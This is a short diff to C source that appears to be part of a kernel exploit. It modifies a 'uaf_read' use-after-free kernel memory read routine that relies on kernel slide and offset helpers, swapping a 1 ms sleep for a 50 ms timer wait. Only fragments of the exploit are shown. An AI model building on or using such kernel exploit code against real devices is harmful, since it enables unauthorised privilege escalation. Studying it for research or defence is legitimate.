@@ -3,9 +3,8 @@
 #include <stdint.h>             // uint32_t
 #include <stdlib.h>             // malloc
 #include <string.h>             // memset, strerror
-#include <unistd.h>             // usleep
 
-#include "common.h"             // ASSERT, DEBUG, PRINT_BUF, ADDR, MIN, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
+#include "common.h"             // ASSERT, DEBUG, PRINT_BUF, TIMER_*, MIN, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
 #include "offsets.h"            // off_vtab
 #include "slide.h"              // get_kernel_slide
@@ -193,6 +192,8 @@ void uaf_read(const char *addr, char *buf, size_t len)
 
         for(size_t off = 0; off < len;)
         {
+            TIMER_START(timer);
+
             size_t c = 0;
             TRY
             ({
@@ -265,7 +266,9 @@ void uaf_read(const char *addr, char *buf, size_t len)
                     _io_release_client(client[c - 1]);
                 }
             })
-            usleep(1000); // Async cleanup
+
+            // Async cleanup
+            TIMER_SLEEP_UNTIL(timer, 50e6); // 50ms
         }
     })
     FINALLY
